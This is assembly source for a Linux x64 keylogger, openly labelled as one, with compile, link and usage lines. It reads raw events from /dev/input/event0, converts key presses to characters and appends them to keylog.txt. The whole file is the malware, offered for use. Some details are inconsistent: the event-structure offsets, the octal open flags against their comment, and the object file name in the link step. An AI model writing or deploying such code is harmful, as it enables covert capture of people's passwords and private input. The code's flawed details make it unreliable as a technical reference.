; Linux x64 assembly keylogger using /dev/input
; Compile: nasm -f elf64 keylogger.asm
; Link: ld -o keylogger keylogger.asm.o
; Usage: ./keylogger

section .data
    dev_input_path db "/dev/input/event0", 0   ; Adjust device path as needed
    log_file db "keylog.txt", 0
    error_msg db "Error: ", 0
    scan_map db \
      0, 0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', 0, 0, \
      'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', 0, 0, \
      'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', 0, 0, 0, \
      'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', 0, 0, 0, 0, 0, ' '

section .bss
    input_fd resq 1            ; Input device file descriptor
    log_fd resq 1              ; Log file descriptor
    event resb 24              ; Input event structure (see struct input_event)
    
section .text
    global _start

_start:
    ; Open input device
    mov rax, 2                 ; syscall: open
    mov rdi, dev_input_path    ; path to device
    mov rsi, 0                 ; O_RDONLY
    mov rdx, 0                 ; mode (not used with O_RDONLY)
    syscall
    
    cmp rax, 0                 ; Check for error
    jl error
    
    mov [input_fd], rax        ; Store file descriptor
    
    ; Open log file (create if not exist, truncate if exists)
    mov rax, 2                 ; syscall: open
    mov rdi, log_file          ; path to file
    mov rsi, 1102o             ; O_CREAT | O_WRONLY | O_APPEND
    mov rdx, 0644o             ; mode: rw-r--r--
    syscall
    
    cmp rax, 0                 ; Check for error
    jl error
    
    mov [log_fd], rax          ; Store file descriptor
    
    ; Main event loop
read_loop:
    mov rax, 0                 ; syscall: read
    mov rdi, [input_fd]        ; input device fd
    mov rsi, event             ; buffer
    mov rdx, 24                ; size (sizeof(struct input_event))
    syscall
    
    cmp rax, 0                 ; Check for error or EOF
    jle cleanup
    
    ; Check if it's a keyboard event (type=1)
    cmp dword [event], 1
    jne read_loop
    
    ; Check if it's a key press event (value=1)
    cmp dword [event+20], 1
    jne read_loop
    
    ; Get key code
    mov eax, dword [event+10]  ; code in event.code
    
    ; Check if key code is within map range
    cmp eax, 58
    jge read_loop
    
    ; Map scancode to ASCII
    movzx eax, byte [scan_map + rax]
    
    ; Ignore unmapped keys
    cmp al, 0
    je read_loop
    
    ; Write key to log file
    push rax                   ; Save character
    
    mov rax, 1                 ; syscall: write
    mov rdi, [log_fd]          ; log file fd
    mov rsi, rsp               ; character on stack
    mov rdx, 1                 ; length: 1 byte
    syscall
    
    pop rax                    ; Restore stack
    
    jmp read_loop              ; Continue loop
    
cleanup:
    ; Close input device
    mov rax, 3                 ; syscall: close
    mov rdi, [input_fd]
    syscall
    
    ; Close log file
    mov rax, 3                 ; syscall: close
    mov rdi, [log_fd]
    syscall
    
    ; Exit cleanly
    mov rax, 60                ; syscall: exit
    mov rdi, 0                 ; status: success
    syscall

error:
    ; Print error message
    mov rax, 1                 ; syscall: write
    mov rdi, 2                 ; fd: stderr
    mov rsi, error_msg
    mov rdx, 7                 ; length
    syscall
    
    ; Exit with error
    mov rax, 60                ; syscall: exit
    mov rdi, 1                 ; status: error
    syscall